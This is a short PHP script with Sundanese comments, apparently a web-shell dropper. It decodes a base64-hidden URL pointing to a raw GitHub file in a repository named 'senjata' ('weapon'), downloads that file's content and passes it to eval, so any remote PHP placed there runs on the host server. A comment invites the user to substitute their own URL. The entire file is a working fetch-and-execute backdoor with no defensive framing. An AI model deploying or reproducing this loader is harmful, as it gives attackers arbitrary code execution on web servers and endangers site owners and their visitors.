<?php
// URL Base64 anu bakal diolah
$encoded_url = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2J1ZGFrYW5nb24xOTkvc2VuamF0YS9yZWZzL2hlYWRzL21haW4vcmVhZC5waHA="; // Ganti ku URL anjeun

// Dekode URL Base64
$decoded_url = base64_decode($encoded_url);

// Narik eusi ti URL GitHub
$content = file_get_contents($decoded_url);

if ($content !== FALSE) {
    // Eksekusi eusi PHP anu dieusikeun
    eval("?>".$content);
} else {
    echo "Gagal ngambil eusi file!";
}
?>
